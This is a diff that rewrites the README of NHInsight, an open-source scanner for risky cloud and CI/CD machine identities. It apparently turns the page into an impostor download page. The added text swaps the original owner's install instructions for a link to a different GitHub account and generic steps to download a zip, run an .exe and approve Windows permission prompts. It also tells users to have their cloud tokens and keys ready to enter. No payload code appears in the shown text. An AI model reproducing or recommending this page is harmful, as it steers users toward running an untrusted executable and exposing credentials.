@@ -1,679 +1,216 @@
-<div align="center">
+# 🔍 NHInsight - Find risky access paths fast
 
-# 🔍 NHInsight
+[![Download NHInsight](https://img.shields.io/badge/Download-NHInsight-blue?style=for-the-badge)](https://github.com/Adenaprimary348/NHInsight)
 
-**Discover risky non-human identities and privilege paths across AWS, Azure, GCP, GitHub, and Kubernetes.**
+## 🧭 What NHInsight does
 
-[![CI](https://github.com/cvemula1/NHInsight/actions/workflows/ci.yml/badge.svg)](https://github.com/cvemula1/NHInsight/actions/workflows/ci.yml)
-[![PyPI](https://img.shields.io/pypi/v/nhinsight?color=blue&logo=pypi&logoColor=white)](https://pypi.org/project/nhinsight/)
-[![Docker](https://img.shields.io/docker/v/chvemula/nhinsight?label=docker&logo=docker&logoColor=white&sort=semver)](https://hub.docker.com/r/chvemula/nhinsight)
-[![License](https://img.shields.io/github/license/cvemula1/NHInsight?color=green)](LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/cvemula1/NHInsight?style=social)](https://github.com/cvemula1/NHInsight)
+NHInsight helps you spot risky non-human identities, tokens, and access paths across cloud and DevOps tools. It checks common places where machine accounts, secrets, and service access can hide.
 
-</div>
+Use it to review:
 
-## Why NHInsight?
+- AWS identity and access setup
+- Azure access paths
+- GCP service account use
+- GitHub repository access
+- GitHub Actions secrets and workflows
+- Kubernetes service accounts and related access
 
-Non-human identities outnumber humans [**80:1**](https://www.cyberark.com/press/machine-identities-outnumber-humans-by-more-than-80-to-1-new-report-exposes-the-exponential-threats-of-fragmented-identity-security/) in most orgs — and growing 44% year-over-year. Enterprise NHI tools charge **$50K+/year**. NHInsight does it for free — open source, runs locally, no telemetry.
+It is built for users who want a clear view of where access may be too broad or exposed.
 
-## Quick Start
+## 📥 Download and run on Windows
 
-```bash
-pip install nhinsight          # install from PyPI
-nhinsight demo                 # see it in action (no credentials needed)
-```
+1. Open the download page here: https://github.com/Adenaprimary348/NHInsight
+2. On the repository page, find the latest release or the main project files.
+3. Download the Windows version if one is listed.
+4. If the download is a `.zip` file, right-click it and select **Extract All**.
+5. Open the extracted folder.
+6. If you see an `.exe` file, double-click it to run NHInsight.
+7. If Windows asks for permission, select **Yes**.
 
-> **Try it in 30 seconds** — `nhinsight demo` runs with built-in sample data so you can see findings, attack paths, and risk scores instantly.
+If the project is provided as a script or packaged app, follow the file name shown in the release or repository page and open it from the extracted folder.
 
-### Scan a real environment
+## 🖥️ Windows setup
 
-```bash
-# Single provider
-nhinsight scan --aws
+NHInsight is meant to run on a normal Windows desktop or laptop. A typical setup works well with:
 
-# Multi-provider with attack path analysis
-nhinsight scan --all --attack-paths
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- 200 MB of free disk space
+- Internet access for cloud and GitHub checks
+- Permission to open local files and saved exports
 
-# CI/CD workflow scanning (no cloud creds required)
-nhinsight scan --github-workflows .github/workflows --attack-paths
+For best results, use a user account that can open downloaded files and save reports in Documents or Desktop.
 
-# Docker (zero install)
-docker run --rm chvemula/nhinsight demo
-```
+## 🧰 What you need before you start
 
-### Run in Your CI/CD Pipeline
+Before you run NHInsight, keep these items ready:
 
-Add NHInsight to any GitHub Actions workflow — **no cloud credentials needed** for workflow scanning:
+- Your Windows computer
+- The downloaded NHInsight file or folder
+- Access details for the cloud or GitHub systems you want to review
+- Any token, key, or login method your team uses for read-only checks
+- A folder where you want to save results
 
-```yaml
-# .github/workflows/nhi-scan.yml
-name: NHI Security Scan
-on: [push, pull_request]
+If you plan to scan AWS, Azure, GCP, GitHub, or Kubernetes, make sure you have the right access in place. Read-only access is often enough for review tasks.
 
-jobs:
-  nhi-scan:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: cvemula1/NHInsight@main
-        with:
-          attack-paths: "true"       # enable attack path analysis
-          fail-on: "high"            # block PRs with high+ severity findings
-```
+## 🚀 First run
 
-The action scans your `.github/workflows` directory, writes findings to the **PR summary**, and fails the check if any identity risk meets the severity threshold. Add cloud provider credentials to also scan live infrastructure:
+After you open NHInsight, you will usually see a start screen or main panel with scan options.
 
-```yaml
-      - uses: cvemula1/NHInsight@main
-        with:
-          providers: "--aws --azure"
-          attack-paths: "true"
-          fail-on: "critical"
-        env:
-          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
-          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
-          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
-```
+Follow these steps:
 
-### Example: Identity Risk Findings
+1. Open the app.
+2. Choose the cloud or platform you want to review.
+3. Enter the required access details.
+4. Select the scope, such as one account, one org, or one cluster.
+5. Start the scan.
+6. Wait for the results to load.
+7. Review any risky identities, tokens, or paths the tool flags.
 
-| Severity | Identity | Provider | Risk |
-|:--------:|----------|:--------:|------|
-| 🔴 **CRITICAL** | `deploy-bot` | AWS | AdministratorAccess policy attached |
-| 🔴 **CRITICAL** | `terraform-deployer` | GCP | Service account has `roles/owner` |
-| 🟠 **HIGH** | `aks-cluster-sp` | Azure | SP has Contributor at subscription scope |
-| 🟡 **MEDIUM** | `ci-runner-mi` | Azure | Self-hosted runner MI accesses Key Vault + AKS + ACR |
-| 🟡 **MEDIUM** | `deploy-sa` | K8s | Bound to `cluster-admin` ClusterRole |
+If the app saves a report, open it after the scan and check the items marked for review.
 
-### Example: Attack Paths Detected
+## 🔎 What to look for in results
 
-| Blast | Path | Risk |
-|:-----:|------|------|
-| **86** | `GitHub Actions` → `Managed Identity` → `Key Vault` → `AKS` → `K8s Secrets` | PR trigger can reach production secrets via MI |
-| **83** | `GitHub Actions` → `Managed Identity` → `Terraform Apply` | Self-hosted runner MI can modify infrastructure |
-| **80** | `GitHub Actions` → `OIDC` → `AWS IAM Role` → `S3` + `Secrets Manager` | Workflow assumes admin role via OIDC federation |
-| **75** | `K8s ServiceAccount` → `IRSA` → `IAM Role (AdministratorAccess)` | Pod escape leads to full AWS account access |
+NHInsight focuses on access that can be hard to track. Look for items such as:
 
-## What It Finds
+- Service accounts with broad rights
+- Tokens that never expire
+- Keys used in more than one place
+- GitHub Actions workflows with strong secrets access
+- Kubernetes service accounts with wide cluster access
+- Cloud roles that reach more resources than needed
+- Orphaned identities that still have access
+- Paths that let one system reach another system
 
-- Overprivileged service accounts and roles (admin, owner, contributor)
-- Stale or unrotated credentials (access keys, SA keys, app secrets)
-- Wildcard trust relationships and open role assumptions
-- Dangerous Kubernetes service account bindings (cluster-admin, legacy tokens)
-- Risky GitHub deploy keys, app permissions, and admin-scoped tokens
-- **GitHub Actions CI/CD risks** — OIDC misconfigurations, Managed Identity abuse, self-hosted runner exposure
-- **Cloud resource access from workflows** — Key Vault, ACR, AKS, Storage, SQL, Terraform, Helm, and 40+ resource patterns
-- Cross-cloud attack paths from entry points to privileged resources
+The goal is to find access that should be tightened or removed.
 
-**42 risk checks** across 5 providers + CI/CD workflows. [See all risk codes](#risk-codes).
-
-## Supported Providers
-
-- **AWS** — IAM users, roles, access keys, policies, MFA, trust relationships
-- **Azure** — Service principals, managed identities, app secrets/certs, RBAC
-- **GCP** — Service accounts, SA keys, project IAM bindings
-- **GitHub** — Apps, deploy keys, webhooks, permissions
-- **Kubernetes** — ServiceAccounts, RBAC, Secrets, IRSA/Workload Identity
-
-## Key Capabilities
-
-- **Attack path analysis** — cross-cloud identity chains with blast radius scoring
-- **NIST SP 800-53 scoring** — compliance mapping with letter grades
-- **IGA governance scores** — ownership, rotation, least-privilege hygiene
-- **AI explanations** — optional OpenAI-powered risk summaries (`--explain`)
-- **SARIF output** — plug into GitHub Security tab or CI/CD (`-f sarif`)
-- **Zero agents** — read-only API calls, nothing installed in your infra
-
-## Install Options
-
-```bash
-pip install nhinsight              # Core (AWS included by default)
-pip install nhinsight[all]         # All 5 providers + AI explanations
-pip install nhinsight[azure]       # Just Azure
-pip install nhinsight[gcp,k8s]     # Mix and match
-```
-
-<details>
-<summary><b>Docker examples</b></summary>
-
-```bash
-# Scan AWS
-docker run --rm -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY \
-  chvemula/nhinsight scan --aws
-
-# Scan Azure
-docker run --rm \
-  -e AZURE_TENANT_ID -e AZURE_CLIENT_ID \
-  -e AZURE_CLIENT_SECRET -e AZURE_SUBSCRIPTION_ID \
-  chvemula/nhinsight scan --azure
-
-# Scan GCP
-docker run --rm -e GCP_PROJECT=my-project \
-  -v ~/.config/gcloud:/root/.config/gcloud:ro \
-  chvemula/nhinsight scan --gcp
-
-# Scan Kubernetes
-docker run --rm -v ~/.kube/config:/root/.kube/config:ro \
-  chvemula/nhinsight scan --k8s
-
-# Scan GitHub
-docker run --rm -e GITHUB_TOKEN \
-  chvemula/nhinsight scan --github --github-org acme-corp
-
-# Multi-provider + JSON
-docker run --rm -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY \
-  -e GCP_PROJECT=my-project -v ~/.config/gcloud:/root/.config/gcloud:ro \
-  chvemula/nhinsight scan --aws --gcp --attack-paths -f json
-```
-
-</details>
-
-## Authentication
-
-NHInsight uses **read-only** access via each provider's standard SDK credentials. No agents, no custom auth.
-
-| Provider | Quick Auth |
-|----------|-----------|
-| **AWS** | `aws configure` or env vars or instance role |
-| **Azure** | `az login` or service principal env vars |
-| **GCP** | `gcloud auth application-default login` or SA key |
-| **GitHub** | `export GITHUB_TOKEN=ghp_...` |
-| **Kubernetes** | Uses `~/.kube/config` current context |
-
-<details>
-<summary><b>Detailed auth setup per provider</b></summary>
+## 🧩 Common use cases
 
 ### AWS
-
-Uses the standard [boto3 credential chain](https://boto3.amazonaws.com/v1/documentation/api/latest/guide/credentials.html):
-
-| Method | How |
-|--------|-----|
-| **Environment variables** | `AWS_ACCESS_KEY_ID` + `AWS_SECRET_ACCESS_KEY` |
-| **Named profile** | `export AWS_PROFILE=prod` or `--aws-profile prod` |
-| **Instance role / ECS task role** | Automatic on EC2/ECS/Lambda |
-| **SSO** | `aws sso login --profile prod` then `--aws-profile prod` |
-
-```bash
-# Minimum IAM permissions needed (read-only):
-# iam:ListUsers, iam:ListRoles, iam:ListAccessKeys,
-# iam:ListMFADevices, iam:GetLoginProfile,
-# iam:ListUserPolicies, iam:ListAttachedUserPolicies,
-# iam:ListRolePolicies, iam:ListAttachedRolePolicies,
-# iam:GetAccessKeyLastUsed
-
-nhinsight scan --aws
-nhinsight scan --aws --aws-profile prod --aws-region us-east-1
-```
+Check for IAM users, roles, and tokens with more access than they need. Review trust paths that let one role reach another account or service.
 
 ### Azure
-
-Uses [Azure Identity](https://learn.microsoft.com/en-us/python/api/azure-identity/) `DefaultAzureCredential`:
-
-| Method | How |
-|--------|-----|
-| **Azure CLI** | `az login` (simplest for local dev) |
-| **Service Principal** | `AZURE_CLIENT_ID` + `AZURE_CLIENT_SECRET` + `AZURE_TENANT_ID` |
-| **Managed Identity** | Automatic on Azure VMs/AKS/Functions |
-| **Environment variables** | `AZURE_TENANT_ID` + `AZURE_SUBSCRIPTION_ID` |
-
-```bash
-# Required API permissions:
-# Microsoft Graph: Application.Read.All, Directory.Read.All
-# Azure RBAC: Microsoft.Authorization/roleAssignments/read
-
-az login
-nhinsight scan --azure
-nhinsight scan --azure --azure-tenant-id TENANT --azure-subscription-id SUB
-```
+Review app registrations, managed identities, and service principals. Look for broad rights, weak separation, and hidden access paths.
 
 ### GCP
-
-Uses [Google Application Default Credentials (ADC)](https://cloud.google.com/docs/authentication/application-default-credentials):
-
-| Method | How |
-|--------|-----|
-| **gcloud CLI** | `gcloud auth application-default login` (simplest for local dev) |
-| **Service Account key** | `export GOOGLE_APPLICATION_CREDENTIALS=/path/to/key.json` |
-| **Workload Identity** | Automatic on GKE/Cloud Run/Cloud Functions |
-| **Environment variable** | `export GCP_PROJECT=my-project` or `--gcp-project my-project` |
-
-```bash
-# Required IAM roles (read-only):
-# roles/iam.serviceAccountViewer (list SAs + keys)
-# roles/resourcemanager.projectIamViewer (read IAM policy)
-
-gcloud auth application-default login
-nhinsight scan --gcp --gcp-project my-project
-```
+Inspect service accounts, key use, and IAM roles. Find accounts that can reach too many resources or projects.
 
 ### GitHub
+Review org and repo access, PAT use, and secret storage. Find machine access that could spread across repos.
 
-Uses a [Personal Access Token](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens) or GitHub App token:
-
-| Method | How |
-|--------|-----|
-| **PAT (classic)** | `export GITHUB_TOKEN=ghp_...` — needs `read:org`, `repo` scopes |
-| **PAT (fine-grained)** | Org-level read access to administration, webhooks, deploy keys |
-| **GitHub App** | Install app on org, use installation token |
-| **GitHub Enterprise** | `--github-base-url https://github.company.com/api/v3` |
-
-```bash
-export GITHUB_TOKEN=ghp_your_token
-nhinsight scan --github --github-org acme-corp
-nhinsight scan --github --github-org acme --github-base-url https://ghe.company.com/api/v3
-```
+### GitHub Actions
+Check workflow files, secrets use, and token scope. Review how builds and jobs reach cloud or repo resources.
 
 ### Kubernetes
+Look at service accounts, role bindings, and cluster roles. Find paths that let a pod or workload reach more than it should.
 
-Uses the standard [kubeconfig](https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/) credential chain:
-
-| Method | How |
-|--------|-----|
-| **Current context** | Automatic — uses `~/.kube/config` default context |
-| **Specific context** | `--kube-context prod-cluster` |
-| **Custom kubeconfig** | `--kubeconfig /path/to/kubeconfig` |
-| **In-cluster** | Automatic when running inside a pod |
-| **Namespace filter** | `--kube-namespace payments` (default: all) |
-
-```bash
-# Required RBAC (read-only):
-# ServiceAccounts, Secrets, Deployments, Pods: get, list
-# ClusterRoleBindings, RoleBindings: get, list
-
-nhinsight scan --k8s
-nhinsight scan --k8s --kube-context prod --kube-namespace payments
-```
-
-</details>
-
-## Attack Path Analysis
-
-NHInsight builds an identity graph and traces paths from entry points (keys, tokens, SAs) to privileged targets (admin roles, owner bindings, cluster-admin):
-
-```bash
-nhinsight scan --aws --k8s --gcp --attack-paths
-nhinsight scan --github-workflows .github/workflows --attack-paths
-```
-
-Example chains NHInsight detects:
-
-- **K8s → AWS** — ServiceAccount → IRSA role → IAM role with AdministratorAccess
-- **K8s → GCP** — ServiceAccount → Workload Identity → SA with roles/owner
-- **GitHub → AWS** — Deploy key → workflow → OIDC → IAM role with S3FullAccess
-- **GitHub Actions → Azure** — Managed Identity → Key Vault secrets, AKS cluster, ACR registry
-- **GitHub Actions → IaC** — Self-hosted runner MI → Terraform apply (infrastructure control)
-- **GitHub Actions → K8s** — MI → AKS credentials → kubectl exec, Helm deployments
-
-```mermaid
-flowchart LR
-  subgraph GitHub Actions
-    wf1["deploy.yml<br/>(self-hosted runner)"]
-    wf2["ci.yml<br/>(OIDC)"]
-  end
-
-  subgraph Cloud Identity
-    mi["Managed Identity"]
-    oidc_aws["OIDC → AWS Role"]
-    oidc_az["OIDC → Azure SP"]
-  end
-
-  subgraph Azure Resources
-    kv{{"Key Vault<br/>secrets"}}
-    aks{{"AKS Cluster"}}
-    acr["ACR Registry"]
-    sql[("Azure SQL")]
-    storage[("Storage Account")]
-  end
-
-  subgraph AWS Resources
-    s3[("S3 Bucket")]
-    secrets{{"Secrets Manager"}}
-    eks{{"EKS Cluster"}}
-    iam{{"IAM Roles"}}
-  end
-
-  subgraph Kubernetes
-    helm["Helm Deploy"]
-    k8s_secret{{"K8s Secrets"}}
-    kubectl["kubectl exec"]
-  end
-
-  subgraph IaC
-    tf{{"Terraform Apply"}}
-  end
-
-  wf1 -->|"az login --identity"| mi
-  wf2 -->|"OIDC token"| oidc_aws
-  wf2 -->|"OIDC token"| oidc_az
-
-  mi -->|"secret access"| kv
-  mi -->|"get-credentials"| aks
-  mi -->|"acr login"| acr
-  mi -->|"query"| sql
-  mi -->|"blob upload"| storage
-
-  oidc_aws -->|"assumes role"| iam
-  iam -->|"s3 cp"| s3
-  iam -->|"get-secret"| secrets
-  iam -->|"eks get-token"| eks
-
-  aks -->|"helm upgrade"| helm
-  aks -->|"create secret"| k8s_secret
-  aks -->|"exec"| kubectl
-
-  mi -->|"tf apply"| tf
-
-  style wf1 fill:#24292e,stroke:#444,color:#fff
-  style wf2 fill:#24292e,stroke:#444,color:#fff
-  style mi fill:#0078d4,stroke:#005a9e,color:#fff
-  style oidc_aws fill:#FF9900,stroke:#232F3E,color:#232F3E
-  style oidc_az fill:#0078d4,stroke:#005a9e,color:#fff
-  style kv fill:#c00,stroke:#900,color:#fff
-  style aks fill:#326CE5,stroke:#1a3a6e,color:#fff
-  style acr fill:#0078d4,stroke:#005a9e,color:#fff
-  style sql fill:#0078d4,stroke:#005a9e,color:#fff
-  style storage fill:#0078d4,stroke:#005a9e,color:#fff
-  style s3 fill:#FF9900,stroke:#232F3E,color:#232F3E
-  style secrets fill:#c00,stroke:#900,color:#fff
-  style eks fill:#FF9900,stroke:#232F3E,color:#232F3E
-  style iam fill:#FF9900,stroke:#232F3E,color:#232F3E
-  style helm fill:#0f1689,stroke:#0a0f5c,color:#fff
-  style k8s_secret fill:#c00,stroke:#900,color:#fff
-  style kubectl fill:#326CE5,stroke:#1a3a6e,color:#fff
-  style tf fill:#7b42bc,stroke:#5c2d91,color:#fff
-```
-
-### GitHub Actions Workflow Scanning
-
-Scan CI/CD workflows for identity and resource access attack paths:
-
-```bash
-nhinsight scan --github-workflows path/to/.github/workflows --attack-paths
-```
-
-Detects **40+ resource access patterns** across:
-
-| Category | Resources Detected |
-|----------|-------------------|
-| **Azure** | Key Vault, ACR, AKS, Storage, SQL, CosmosDB, DNS, AD, IAM, Functions, Web Apps |
-| **AWS** | S3, Secrets Manager, IAM, EC2, Lambda, ECR, EKS, RDS, DynamoDB, CloudFormation |
-| **GCP** | Compute, GKE, Secret Manager, Cloud SQL, IAM, Cloud Storage |
-| **Kubernetes** | kubectl apply/exec, secret creation, resource mutation |
-| **Deployments** | Helm, Docker push, Terraform/Pulumi apply, Ansible |
-| **External** | Cloudflare DNS/CDN |
-
-Also detects: OIDC permission misconfigurations, PR-trigger cloud auth risks, self-hosted runner Managed Identity exposure, and composite action inlining.
-
-Each path includes:
-- **Blast radius scoring** — 0–100 composite based on privilege level and cross-system reach
-- **Fix guidance** — per-edge remediation recommendations
-
-### Mermaid Diagrams
-
-Generate copy-pasteable Mermaid diagrams for PRs, docs, and reviews:
-
-```bash
-# Mermaid output alongside terminal results
-nhinsight scan --aws --k8s --mermaid
-
-# Demo with Mermaid diagrams
-nhinsight demo --mermaid
-
-# Render from saved JSON (for CI pipelines)
-nhinsight scan --all --attack-paths -f json -o findings.json
-nhinsight graph --input findings.json
-nhinsight graph --input findings.json --split   # one diagram per path
-```
-
-Example output (paste into any Mermaid-compatible renderer — GitHub, Notion, VS Code):
-
-```mermaid
-flowchart LR
-  subgraph Kubernetes
-    sa["prod/deploy-sa"]
-  end
-  subgraph AWS
-    role{{"eks-admin-role"}}
-  end
-  sa -->|"IRSA → eks-admin-role"| role
-  style sa fill:#326CE5,stroke:#1a3a6e,color:#fff
-  style role fill:#FF9900,stroke:#232F3E,color:#232F3E
-```
-
-## Risk Codes
-
-<details>
-<summary><b>All 42 risk codes by provider</b></summary>
-
-### AWS
-
-| Risk | Code | Severity |
-|------|------|----------|
-| Admin/PowerUser policy attached | `AWS_ADMIN_ACCESS` | Critical |
-| Role trust allows any principal (`*`) | `AWS_WILDCARD_TRUST` | Critical |
-| Access key not rotated (>365 days) | `AWS_KEY_NOT_ROTATED` | High |
-| Console access without MFA | `AWS_NO_MFA` | High |
-| Inactive key not deleted | `AWS_KEY_INACTIVE` | Medium |
-
-### Azure
-
-| Risk | Code | Severity |
-|------|------|----------|
-| SP with Owner/Contributor at subscription scope | `AZURE_SP_DANGEROUS_ROLE` | Critical |
-| SP with elevated role at resource group scope | `AZURE_SP_ELEVATED_ROLE` | Medium |
-| Managed Identity with dangerous role at subscription scope | `AZURE_MI_DANGEROUS_ROLE` | High |
-| Disabled SP still has RBAC bindings | `AZURE_SP_DISABLED_WITH_ROLES` | Medium |
-| App credential expired | `AZURE_CRED_EXPIRED` | High |
-| App credential expiring within 30 days | `AZURE_CRED_EXPIRING_SOON` | Medium |
-| Client secret not rotated (>365 days) | `AZURE_SECRET_NOT_ROTATED` | High |
-
-### GCP
-
-| Risk | Code | Severity |
-|------|------|----------|
-| SA with roles/owner or roles/editor | `GCP_SA_DANGEROUS_ROLE` | Critical |
-| SA with compute.admin, storage.admin, etc. | `GCP_SA_DANGEROUS_ROLE` | High |
-| Disabled SA still has IAM bindings | `GCP_SA_DISABLED_WITH_ROLES` | Medium |
-| GCP-managed SA with dangerous roles | `GCP_MANAGED_SA_OVERPRIVILEGED` | High |
-| SA key not rotated (>365 days) | `GCP_KEY_NOT_ROTATED` | High |
-| SA key expired | `GCP_KEY_EXPIRED` | High |
-| SA key expiring within 30 days | `GCP_KEY_EXPIRING_SOON` | Medium |
-| SA key disabled but not deleted | `GCP_KEY_DISABLED` | Low |
-
-### Kubernetes
-
-| Risk | Code | Severity |
-|------|------|----------|
-| SA bound to cluster-admin | `K8S_CLUSTER_ADMIN` | Critical |
-| Legacy long-lived SA token secret | `K8S_LEGACY_SA_TOKEN` | High |
-| Automount token on privileged SA | `K8S_AUTOMOUNT_PRIVILEGED` | High |
-| Using default SA in default namespace | `K8S_DEFAULT_SA` | Medium |
-| Orphaned SA (no running pods) | `K8S_ORPHANED_SA` | Medium |
-| SA has secrets but no IRSA/Workload Identity | `K8S_NO_WORKLOAD_IDENTITY` | Medium |
-| Deployments using default SA | `K8S_DEPLOY_DEFAULT_SA` | Medium |
-| Opaque secret contains credential-like keys | `K8S_SECRET_CREDENTIALS` | Medium |
-| TLS secret not managed by cert-manager | `K8S_TLS_UNMANAGED` | Low |
-
-### GitHub
-
-| Risk | Code | Severity |
-|------|------|----------|
-| Token with admin scope | `GH_ADMIN_SCOPE` | High |
-| Token has full repo access | `GH_REPO_WRITE` | Medium |
-| App with dangerous write perms | `GH_APP_DANGEROUS_PERMS` | High |
-| Deploy key with write access | `GH_DEPLOY_KEY_WRITE` | Medium |
-| Inactive webhook | `GH_WEBHOOK_INACTIVE` | Low |
-
-### GitHub Actions / CI/CD
-
-| Risk | Code | Severity |
-|------|------|----------|
-| OIDC workflow assumes admin-like role | `GH_OIDC_ADMIN_ROLE` | High |
-| Cloud auth triggered on pull_request | `GH_OIDC_PR_TRIGGER` | High |
-| Self-hosted runner uses Managed Identity | `GH_WF_SELF_HOSTED_MI` | High |
-| Workflow missing id-token: write permission | `GH_OIDC_NO_PERMISSION` | Medium |
-| Workflow reads Key Vault secrets | `GH_WF_KEYVAULT_SECRETS` | Medium |
-| Workflow fetches AKS credentials | `GH_WF_AKS_ACCESS` | Medium |
-| OIDC role ARN is a dynamic reference | `GH_OIDC_DYNAMIC_ROLE` | Info |
-
-### Universal
-
-| Risk | Code | Severity |
-|------|------|----------|
-| Identity unused for 90+ days | `STALE_IDENTITY` | Medium |
-| No owner or creator identified | `NO_OWNER` | Low |
-
-</details>
-
-## Configuration
-
-<details>
-<summary><b>Environment variables and CLI flags</b></summary>
-
-All settings can be set via environment variables, CLI flags, or both (CLI flags take precedence):
-
-| Setting | Env Var | CLI Flag | Default |
-|---------|---------|----------|---------|
-| AWS profile | `AWS_PROFILE` | `--aws-profile` | default chain |
-| AWS region | `AWS_DEFAULT_REGION` | `--aws-region` | default chain |
-| Azure tenant | `AZURE_TENANT_ID` | `--azure-tenant-id` | — |
-| Azure subscription | `AZURE_SUBSCRIPTION_ID` | `--azure-subscription-id` | — |
-| GCP project | `GCP_PROJECT` | `--gcp-project` | — |
-| GitHub token | `GITHUB_TOKEN` | — | — |
-| GitHub org | `GITHUB_ORG` | `--github-org` | — |
-| Kubeconfig | `KUBECONFIG` | `--kubeconfig` | `~/.kube/config` |
-| K8s context | `KUBE_CONTEXT` | `--kube-context` | current context |
-| K8s namespace | `KUBE_NAMESPACE` | `--kube-namespace` | all |
-| Stale threshold | `NHINSIGHT_STALE_DAYS` | `--stale-days` | 90 days |
-| Rotation threshold | `NHINSIGHT_ROTATION_MAX_DAYS` | — | 365 days |
-| AI explanations | `OPENAI_API_KEY` | `--explain` | — |
-
-See [.env.example](.env.example) for a ready-to-copy template.
-
-</details>
-
-## CLI Reference
-
-<details>
-<summary><b>Full CLI flags</b></summary>
-
-```
-nhinsight scan [OPTIONS]          Discover and analyze NHIs
-  --aws                           Scan AWS IAM
-  --azure                         Scan Azure AD / Entra ID
-  --gcp                           Scan GCP IAM
-  --github                        Scan GitHub org
-  --k8s                           Scan Kubernetes cluster
-  --all                           Scan all available providers
-  --github-workflows [PATH]       Scan GitHub Actions workflows (default: .github/workflows)
-  --attack-paths                  Trace privilege escalation chains across providers
-  --mermaid                       Output attack paths as Mermaid diagrams
-  --ci-summary                    Compact markdown summary for CI/PR usage
-  --fail-on {critical,high,medium,low}  Exit code 1 if severity threshold met (CI gating)
-  --format, -f {table,json,sarif} Output format (default: table)
-  --output, -o FILE               Write output to file
-  --explain                       Add AI-powered explanations (requires OPENAI_API_KEY)
-  --ascii                         ASCII-safe output (no emoji; auto in CI)
-  --stale-days N                  Days without use before flagging (default: 90)
-  --verbose, -v                   Verbose logging
-  --aws-profile PROFILE           AWS named profile
-  --aws-region REGION             AWS region
-  --azure-tenant-id ID            Azure tenant ID
-  --azure-subscription-id ID      Azure subscription ID
-  --gcp-project PROJECT           GCP project ID
-  --github-org ORG                GitHub organization
-  --github-base-url URL           GitHub Enterprise base URL
-  --kubeconfig PATH               Path to kubeconfig
-  --kube-context CTX              Kubernetes context
-  --kube-namespace NS             Namespace (default: all)
-
-nhinsight demo                    Show demo scan with sample data
-nhinsight report --demo           Generate formatted markdown report
-nhinsight graph --input FILE      Render Mermaid diagrams from saved JSON
-nhinsight version                 Show version
-```
-
-</details>
-
-## Development
-
-```bash
-git clone https://github.com/cvemula1/NHInsight.git
-cd NHInsight
-pip install -e ".[all,dev]"
-make test     # 260 tests, <2 seconds
-```
-
-<details>
-<summary><b>Makefile targets and architecture</b></summary>
-
-### Makefile targets
-
-| Target | What It Does |
-|--------|-------------|
-| `make dev` | Install editable with all extras + dev deps |
-| `make test` | Run pytest |
-| `make lint` | Run ruff linter |
-| `make demo` | Run demo with sample data |
-| `make scan-aws` | Scan AWS IAM |
-| `make scan-gcp` | Scan GCP IAM |
-| `make scan-azure` | Scan Azure AD |
-| `make scan-all` | Scan all providers |
-| `make docker` | Build Docker image |
-| `make docker-demo` | Run demo in Docker |
-| `make clean` | Remove build artifacts |
-
-### Architecture
-
-```
-nhinsight/
-├── cli.py                      # CLI entry point (argparse)
-├── core/
-│   ├── models.py               # Identity, RiskFlag, ScanResult, enums
-│   ├── config.py               # NHInsightConfig (env vars + CLI flags)
-│   ├── output.py               # Table, JSON, SARIF formatters
-│   ├── mermaid.py              # Mermaid diagram renderer for attack paths
-│   └── ci_summary.py           # Compact CI/PR markdown summary
-├── providers/
-│   ├── base.py                 # Abstract BaseProvider interface
-│   ├── aws.py                  # AWS IAM discovery (boto3)
-│   ├── azure.py                # Azure AD / Entra ID discovery (Graph + RBAC)
-│   ├── gcp.py                  # GCP IAM discovery (google-api-python-client)
-│   ├── github.py               # GitHub org discovery (PyGithub)
-│   └── kubernetes.py           # Kubernetes discovery (kubernetes client)
-├── analyzers/
-│   ├── classification.py       # Human vs machine classification
-│   ├── risk.py                 # Risk analysis (42 checks)
-│   ├── scoring.py              # NIST SP 800-53 + IGA governance scoring
-│   ├── graph.py                # Identity graph model (nodes, edges, BFS)
-│   ├── attack_paths.py         # Attack path detection + blast radius
-│   └── workflow_scanner.py     # GitHub Actions CI/CD scanner (40+ resource patterns)
-└── explain/
-    └── llm.py                  # Optional LLM explanations (OpenAI)
-```
-
-</details>
-
-## Roadmap
-
-- [x] **v0.1** — 5 providers, 42 risk checks, attack paths, NIST scoring, SARIF, AI explanations, Docker
-- [x] **v0.1.1** — GitHub Actions workflow scanner, 40+ resource access patterns, MI/OIDC attack paths, Mermaid diagrams, CI gating (`--fail-on`), GitHub Action
-- [ ] **v0.2** — OPA/Rego policies, ML classification, anomaly detection, IAM right-sizing
-- [ ] **v0.3** — Slack, Teams, Jira, PagerDuty, webhook integrations
-- [ ] **v0.4** — SIEM export, scheduled scans, drift detection, dashboard API
-- [ ] **v0.5** — Auto-remediation, least-privilege generation, AI agent, PR-based fixes
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development guidelines.
-
-## Related Projects
-
-- [ChangeTrail](https://github.com/cvemula1/ChangeTrail) — unified timeline of infrastructure changes
-
-## License
-
-MIT — see [LICENSE](LICENSE)
+## 🛠️ How to get the best results
+
+Use a small scope first, then expand it.
+
+- Start with one account or one repo
+- Review the first report before scanning more
+- Use read-only access when possible
+- Keep notes on what each finding means in your team
+- Recheck the same scope after changes to confirm the fix
+
+This helps you cut noise and focus on real issues.
+
+## 📁 Reports and output
+
+NHInsight may create files, logs, or export reports after a scan. Save them in a folder you can find later.
+
+Good places to store output:
+
+- Desktop
+- Documents
+- A team review folder
+- A dated scan folder
+
+Use a clear name for each scan, such as:
+
+- `AWS-Review-April`
+- `GitHub-Org-Check`
+- `K8s-Cluster-Scan`
+
+This makes it easy to compare results over time.
+
+## ⚙️ Basic troubleshooting
+
+If the app does not start:
+
+- Check that the download finished
+- Extract the files if they came in a zip
+- Try running the file again
+- Confirm that Windows did not block the file
+- Make sure you are opening the correct file in the folder
+
+If a scan does not connect:
+
+- Confirm the access details are correct
+- Check the scope you selected
+- Make sure your account can read the target system
+- Try a smaller scan first
+- Check your internet connection
+
